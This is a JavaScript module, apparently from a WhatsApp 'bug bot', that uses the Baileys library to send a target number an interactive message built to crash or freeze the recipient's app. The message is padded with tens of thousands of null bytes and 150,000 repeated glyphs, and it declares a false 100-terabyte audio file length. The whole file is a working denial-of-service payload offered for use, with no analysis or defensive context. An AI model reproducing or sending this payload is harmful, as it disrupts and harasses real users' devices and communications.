const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');


async function BlankHard(sock, target) {
    const msg2 = {
        interactiveMessage: {
            header: {
                title: "Zami WolF",
                },
            body: {},
            footer: {
                text: "zami_vip_bugbot",
                hasMediaAttachment: true,
      audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mp4",
      fileSha256: "BAcpC1KGx40bu/FV78kBAafPjkkdj6DLVAx+B1g3avQ=",
      fileLength: "109951162777600",
      seconds: 1,
      ptt: true,
      mediaKey: "1KXHR1pvx2+y01K6Dewevx5FF5O5wfc5iE/oHIua2WY=",
      fileEncSha256: "CggqdAt0fX+QHjKnfyX2OjO1OoUXLm5WlVlv6f5aGCU=",
      directPath: "/v/t62.7114-24/553151991_818685271268692_6795957783606894464_n.enc?ccb=11-4&oh=01_Q5Aa4AHdygHdhtAMHQB0P7fDG2jGlUkQfSzCPw4NPnWbiF8eKQ&oe=69E640DB&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1774107510",
      waveform: "EBAREicPEigjMkgwMDITDQ8QFBYkCwwMDAwIBAUCBScpMkNkUE1GTT1KVVk0VUVOWlUtWEk0X0o+Xh4XFxAIAQ==",
      }
    },
            nativeFlowMessage: {
                buttons: [
                    {
  name: "single_select",
  buttonParamsJson: JSON.stringify({
    title: "𝖷𝟩",
    sections: [
      {
        title: "",
        rows: Array.from({ length: 4 }, (_, i) => ({
          id: "\u0000".repeat(9000),
          title: "\u0000".repeat(10000)
        }))
      }
    ]
  })
},
                    {
  name: "cta_call",
  buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(150000),
                  phone_number: "\u0000".repeat(5000)
                })
}
                    ]
                },
            contextInfo: {
                remoteJid: Math.random().toString(36) + "REQUEST_LOCATION",
                quotedMessage: {
                    conversation: "@zami_vip_bugbot"
                    },
                }
            }
        }
         
        await sock.relayMessage(target,msg2,{
            participant: { jid: target }
            })
}

module.exports = { BlankHard }